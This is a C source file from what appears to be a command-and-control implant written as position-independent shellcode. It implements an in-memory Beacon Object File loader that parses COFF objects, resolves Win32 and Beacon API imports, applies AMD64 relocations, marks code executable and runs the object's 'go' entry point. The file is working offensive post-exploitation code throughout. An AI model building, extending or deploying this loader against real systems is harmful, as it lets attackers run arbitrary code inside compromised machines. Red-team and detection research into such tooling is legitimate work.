#include <windows.h>
#include <Agent.h>
#include <Defines.h>
#include <Internals.h>
#include <Hash.h>
#include <Bof.h>


// Internal string helpers
// No stdlib available in PIC shellcode - these are tiny stubs.
static inline BOOL bof_startswith( PCHAR s, PCHAR prefix ) {
    while ( *prefix ) {
        if ( *s++ != *prefix++ ) return FALSE;
    }
    return TRUE;
}

static inline PCHAR bof_strchr( PCHAR s, CHAR c ) {
    while ( *s ) { if ( *s == c ) return s; s++; }
    return nullptr;
}


// Bof_RslRel - apply one AMD64 relocation to a patch site
static DECLFN VOID Bof_RslRel( PVOID Base, PVOID RelocAddr, UINT16 Type )
{
    // DEF32(RelocAddr) holds an addend (usually 0 in a fresh .o file, sometimes -4).
    // FlRel = Base + addend = the final target address we want to reach.
    PVOID FlRel = (PVOID)( (ULONG_PTR)Base + BOF_DEF32(RelocAddr) );

    switch ( Type ) {
        case IMAGE_REL_AMD64_REL32:
            BOF_DEF32(RelocAddr) = (INT32)( (ULONG_PTR)FlRel - (ULONG_PTR)RelocAddr - 4 );
            break;
        case IMAGE_REL_AMD64_REL32_1:
            BOF_DEF32(RelocAddr) = (INT32)( (ULONG_PTR)FlRel - (ULONG_PTR)RelocAddr - 4 - 1 );
            break;
        case IMAGE_REL_AMD64_REL32_2:
            BOF_DEF32(RelocAddr) = (INT32)( (ULONG_PTR)FlRel - (ULONG_PTR)RelocAddr - 4 - 2 );
            break;
        case IMAGE_REL_AMD64_REL32_3:
            BOF_DEF32(RelocAddr) = (INT32)( (ULONG_PTR)FlRel - (ULONG_PTR)RelocAddr - 4 - 3 );
            break;
        case IMAGE_REL_AMD64_REL32_4:
            BOF_DEF32(RelocAddr) = (INT32)( (ULONG_PTR)FlRel - (ULONG_PTR)RelocAddr - 4 - 4 );
            break;
        case IMAGE_REL_AMD64_REL32_5:
            BOF_DEF32(RelocAddr) = (INT32)( (ULONG_PTR)FlRel - (ULONG_PTR)RelocAddr - 4 - 5 );
            break;
        case IMAGE_REL_AMD64_ADDR64:
            BOF_DEF64(RelocAddr) = (INT64)(ULONG_PTR)FlRel;
            break;
        // Unknown relocation type - leave the patch site untouched.
        default:
            break;
    }
}


// Bof_RslApi - resolve one __imp_ symbol to a live function pointer
DECLFN PVOID Bof_RslApi( PCHAR sym_name )
{
    G_AGENT;

    // sym_name always starts with "__imp_" - skip those 6 bytes.
    PCHAR name = sym_name + 6;

    // Beacon API or Ax API (implemented inside the agent)
    if ( bof_startswith(name, (PCHAR)"Beacon") || bof_startswith(name, (PCHAR)"Ax") ) {
        return Bof_RslBeaconApi( name );
    }

    // Win32 API via "LIB$FUNCTION" format
    // Find the '$' separator.
    PCHAR dollar = bof_strchr( name, '$' );

    // Bare name (no '$'): BOF compiler emitted a direct import without a DLL prefix.
    // First check against our already-resolved agent table (no extra API calls needed).
    // Fall back to dynamic resolution for anything we don't have in the struct.
    if ( !dollar ) {
        UINT32 h = Hash::Str( name );
        if ( h == Hash::Str( "GetProcAddress" ) ) return (PVOID)Self->Krnl32.GetProcAddress;
        if ( h == Hash::Str( "LoadLibraryA"   ) ) return (PVOID)Self->Krnl32.LoadLibraryA;

        // Unknown bare name - try KERNEL32 then KERNELBASE
        const PCHAR libs[] = { (PCHAR)"KERNEL32.dll", (PCHAR)"KERNELBASE.dll", nullptr };
        for ( INT i = 0; libs[i]; i++ ) {
            PVOID hmod = (PVOID)Self->Krnl32.LoadLibraryA( libs[i] );
            if ( !hmod ) continue;
            PVOID fn = (PVOID)Self->Krnl32.GetProcAddress( (HMODULE)hmod, name );
            if ( fn ) return fn;
        }
        return nullptr;
    }

    // Build "LIBRARY.dll\0" in a stack buffer.
    // Windows LoadLibraryA is case-insensitive, so "KERNEL32.dll" works fine.
    CHAR  lib_name[128];
    ULONG lib_len = (ULONG)( dollar - name );
    if ( lib_len + 5 > sizeof(lib_name) ) return nullptr; // overflow guard
    Mem_Copy( lib_name, name, lib_len );
    CHAR ext[] = { '.','d','l','l','\0' };
    Mem_Copy( lib_name + lib_len, ext, 5 );

    PCHAR func_name = dollar + 1;

    // If the DLL is already loaded, LoadLibraryA bumps the refcount and returns
    // the same handle - no disk I/O.
    PVOID hmod = (PVOID)Self->Krnl32.LoadLibraryA( lib_name );
    if ( !hmod ) return nullptr;

    // GetProcAddress is case-sensitive - func_name must be the exact export name.
    return (PVOID)Self->Krnl32.GetProcAddress( (HMODULE)hmod, func_name );
}


// Bof_Map - parse a COFF object file into executable memory

// Memory layout of the final allocation:
DECLFN BOOL Bof_Map( BYTE* buf, ULONG size, BOF_MAPPED* out )
{
    if ( !buf || size < sizeof(IMAGE_FILE_HEADER) || !out )
        return FALSE;

    Mem_Set( out, 0, sizeof(BOF_MAPPED) );

    // Parse the top-level COFF header
    // The IMAGE_FILE_HEADER is at byte 0 of a .o file (no DOS or PE+ header).
    PIMAGE_FILE_HEADER    file_hdr = (PIMAGE_FILE_HEADER)buf;
    IMAGE_SECTION_HEADER* sec_hdrs = (IMAGE_SECTION_HEADER*)( buf + sizeof(IMAGE_FILE_HEADER) );

    ULONG nsec = (ULONG)file_hdr->NumberOfSections;
    ULONG nsym = (ULONG)file_hdr->NumberOfSymbols;

    if ( nsec == 0 || nsym == 0 ) return FALSE;

    // Bounds check: symbol table must be within buf
    if ( (ULONG64)file_hdr->PointerToSymbolTable + (ULONG64)nsym * sizeof(IMAGE_SYMBOL) > size )
        return FALSE;

    // The symbol table sits at PointerToSymbolTable; the string table follows it.
    PIMAGE_SYMBOL syms   = (PIMAGE_SYMBOL)( buf + file_hdr->PointerToSymbolTable );
    PCHAR         strtab = (PCHAR)( syms + nsym ); // immediately after last symbol

    // Allocate internal bookkeeping arrays on the agent heap
    BOF_SECTION* sections = (BOF_SECTION*)Heap_Alloc( nsec * sizeof(BOF_SECTION) );
    BOF_SYMBOL*  symbols  = (BOF_SYMBOL* )Heap_Alloc( nsym * sizeof(BOF_SYMBOL)  );
    if ( !sections || !symbols ) {
        if ( sections ) Heap_Free( sections );
        if ( symbols  ) Heap_Free( symbols  );
        return FALSE;
    }
    Mem_Set( sections, 0, nsec * sizeof(BOF_SECTION) );
    Mem_Set( symbols,  0, nsym * sizeof(BOF_SYMBOL)  );

    // First pass: walk symbol table
    ULONG mm_size = 0;

    for ( ULONG i = 0; i < nsym; i++ ) {
        // COFF symbol name rules:
        //   N.Name.Short != 0  -> the name is the 8 bytes of N.ShortName (padded with nulls)
        //   N.Name.Short == 0  -> N.Name.Long is a byte offset into the string table
        PCHAR sym_name = ( syms[i].N.Name.Short != 0 )
                       ? (PCHAR)syms[i].N.ShortName
                       : ( strtab + syms[i].N.Name.Long );

        symbols[i].Name          = sym_name;
        symbols[i].SectionNumber = (INT16)syms[i].SectionNumber;
        symbols[i].Rva           = syms[i].Value;

        if ( bof_startswith(sym_name, (PCHAR)"__imp_") ) {
            // External import (Win32 or Beacon API).  The import table needs
            // one PVOID slot per reference to this symbol.  Accumulate space
            // here (PAGE_ALIGN gives generous headroom for multiple references
            // to the same symbol in the relocation pass below).
            symbols[i].Type = COFF_SYM_IMP;
            symbols[i].Ptr  = Bof_RslApi( sym_name );
            mm_size = (ULONG)BOF_PAGE_ALIGN( mm_size + sizeof(PVOID) );
        }
        else if ( syms[i].SectionNumber > 0 ) {
            // Symbol defined in this object file. ISFCN tests whether the
            // "derived type" nibble of the Type field encodes a function.
            symbols[i].Type = ISFCN( syms[i].Type ) ? COFF_SYM_FNC : COFF_SYM_VAR;
        }
    }

    // Add section sizes to the total allocation.
    for ( ULONG i = 0; i < nsec; i++ ) {
        mm_size = (ULONG)BOF_PAGE_ALIGN( mm_size + sec_hdrs[i].SizeOfRawData );
    }

    // Allocate one RW block large enough for all sections + import table 
    PVOID mm_base = Mem_Alloc( mm_size );
    if ( !mm_base ) {
        Heap_Free( sections );
        Heap_Free( symbols  );
        return FALSE;
    }

    // Second pass: copy section raw data into memory
    // Sections are placed sequentially, each page-aligned.
    PVOID cur = mm_base;
    for ( ULONG i = 0; i < nsec; i++ ) {
        sections[i].Base = cur;
        sections[i].Size = sec_hdrs[i].SizeOfRawData;

        if ( sec_hdrs[i].SizeOfRawData > 0 && sec_hdrs[i].PointerToRawData > 0 ) {
            // VirtualAddress is the in-section offset for the first byte of
            // raw data (typically 0 in a .o file, since nothing is linked yet).
            Mem_Copy( (BYTE*)cur + sec_hdrs[i].VirtualAddress,
                      buf + sec_hdrs[i].PointerToRawData,
                      sec_hdrs[i].SizeOfRawData );
        }

        cur = (PVOID)BOF_PAGE_ALIGN( (ULONG_PTR)cur + sec_hdrs[i].SizeOfRawData );
    }

    // cur now points to the start of the import pointer table region.
    PVOID* import_table = (PVOID*)cur;
    ULONG  imp_iter     = 0;  // slot index within the import table

    // Third pass: apply relocations
    for ( ULONG i = 0; i < nsec; i++ ) {
        if ( sec_hdrs[i].NumberOfRelocations == 0 ) continue;

        PIMAGE_RELOCATION relocs = (PIMAGE_RELOCATION)(
            buf + sec_hdrs[i].PointerToRelocations );

        for ( USHORT r = 0; r < sec_hdrs[i].NumberOfRelocations; r++ ) {
            ULONG sym_idx  = relocs[r].SymbolTableIndex;
            if ( sym_idx >= nsym ) continue;

            // VirtualAddress here is the byte offset within the section's raw data.
            PVOID rela_addr = (PVOID)(
                (ULONG_PTR)sections[i].Base + relocs[r].VirtualAddress );

            if ( symbols[sym_idx].Type == COFF_SYM_IMP ) {
                // __imp_ reference: write the resolved function pointer into
                // the next free import table slot, then patch the relocation
                // site with a RIP-relative address to that slot.
                import_table[imp_iter] = symbols[sym_idx].Ptr;
                BOF_DEF32(rela_addr) = (INT32)(
                    (ULONG_PTR)&import_table[imp_iter] - (ULONG_PTR)rela_addr - 4 );
                imp_iter++;
            }
            else {
                // In-object symbol (function or variable).  Find where it lives
                // in our loaded section memory and apply a standard relocation.
                INT16 sec_idx = symbols[sym_idx].SectionNumber - 1; // convert to 0-based
                if ( sec_idx < 0 || (ULONG)sec_idx >= nsec ) continue;

                // target_addr = section base + symbol's in-section offset
                PVOID target_addr = (PVOID)(
                    (ULONG_PTR)sections[sec_idx].Base + symbols[sym_idx].Rva );
                Bof_RslRel( target_addr, rela_addr, relocs[r].Type );
            }
        }
    }

    // Flip executable sections to PAGE_EXECUTE_READ
    // Sections with IMAGE_SCN_MEM_EXECUTE (.text) must be RX so we can call
    // into them.  All others stay RW.
    for ( ULONG i = 0; i < nsec; i++ ) {
        if ( sec_hdrs[i].Characteristics & IMAGE_SCN_MEM_EXECUTE ) {
            Mem_Protect( sections[i].Base, sections[i].Size, PAGE_EXECUTE_READ );
        }
    }

    // Find the 'go' entrypoint
    // Every BOF exports exactly one symbol: go(char* args, int argc).
    // Walk the symbol table looking for a FNC symbol named "go".
    PVOID entry = nullptr;
    for ( ULONG i = 0; i < nsym; i++ ) {
        if ( symbols[i].Type != COFF_SYM_FNC ) continue;
        PCHAR name = symbols[i].Name;
        // "go" = exactly 2 chars followed by a null terminator
        if ( name[0]=='g' && name[1]=='o' && name[2]=='\0' ) {
            INT16 sec_idx = symbols[i].SectionNumber - 1;
            if ( sec_idx >= 0 && (ULONG)sec_idx < nsec ) {
                entry = (PVOID)( (ULONG_PTR)sections[sec_idx].Base + symbols[i].Rva );
            }
            break;
        }
    }

    out->MmBase     = mm_base;
    out->MmSize     = mm_size;
    out->EntryPoint = entry;
    out->Sections   = sections;
    out->Symbols    = symbols;
    out->SecCount   = nsec;
    out->SymCount   = nsym;

    return TRUE;
}

// Bof_Execute - call the BOF's go(args, argc) entrypoint
DECLFN BOOL Bof_Execute( BOF_MAPPED* mapped, BYTE* args, ULONG argc )
{
    if ( !mapped || !mapped->EntryPoint ) return FALSE;

    // BOF calling convention: void go(char* args, int argc)
    // 'args' is a datap-compatible packed buffer; 'argc' is its byte length.
    typedef VOID (*BOF_GO)( BYTE*, ULONG );
    BOF_GO go_fn = (BOF_GO)mapped->EntryPoint;
    go_fn( args, argc );

    return TRUE;
}


// Bof_Unmap - release all memory from a mapped COFF
DECLFN VOID Bof_Unmap( BOF_MAPPED* mapped )
{
    if ( !mapped ) return;

    if ( mapped->MmBase   ) Mem_Free( mapped->MmBase, mapped->MmSize );
    if ( mapped->Sections ) Heap_Free( mapped->Sections );
    if ( mapped->Symbols  ) Heap_Free( mapped->Symbols  );

    Mem_Set( mapped, 0, sizeof(BOF_MAPPED) );
}


// Bof_Loader - one-shot helper: Map -> Execute -> Unmap
DECLFN BOOL Bof_Loader( BYTE* buf, ULONG size, BYTE* args, ULONG argc )
{
    BOF_MAPPED mapped;
    Mem_Set( &mapped, 0, sizeof(BOF_MAPPED) );

    if ( !Bof_Map( buf, size, &mapped ) ) return FALSE;

    BOOL ok = Bof_Execute( &mapped, args, argc );
    Bof_Unmap( &mapped );
    return ok;
}
